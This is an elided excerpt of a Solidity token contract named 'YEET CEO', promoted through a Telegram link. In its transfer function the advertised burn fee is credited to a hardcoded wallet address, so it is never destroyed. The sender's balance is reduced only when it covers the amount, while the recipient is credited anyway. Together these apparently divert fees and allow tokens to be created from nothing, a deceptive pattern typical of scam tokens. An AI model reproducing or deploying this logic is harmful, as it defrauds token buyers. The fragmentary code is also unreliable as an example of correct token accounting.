...
// Submitted for Telegram: https://t.me/yeet_ceo
...
contract  YeetCeo  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "YEET CEO";
    string private _symbol = "YEETCEO";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xC8B6424f08cEEdD8B2eEaa48075A88dF954C784D] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0xC8B6424f08cEEdD8B2eEaa48075A88dF954C784D, _bruntoken);
        }
